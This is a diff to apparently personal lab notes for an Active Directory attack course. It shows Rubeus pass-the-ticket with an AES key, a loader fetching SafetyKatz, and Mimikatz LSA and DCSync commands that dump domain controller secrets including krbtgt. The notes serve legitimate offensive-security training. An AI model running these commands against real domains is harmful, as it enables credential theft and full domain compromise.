@@ -327,6 +327,7 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 - Use the Golden ticket to (once again) get domain admin privileges from a machine.
 *Extract secrets from the domain controller of dollarcorp*
 Now that we had extracted a domain admin's hash we can dump the secrets from a domain controller
+First we get a session on the controller
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
@@ -347,7 +348,10 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 lsadump::lsa /patch
 ```
 ![[Pasted image 20231023111808.png]]
+or
+```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
 
 `Administrator- DCORP-DC`
 
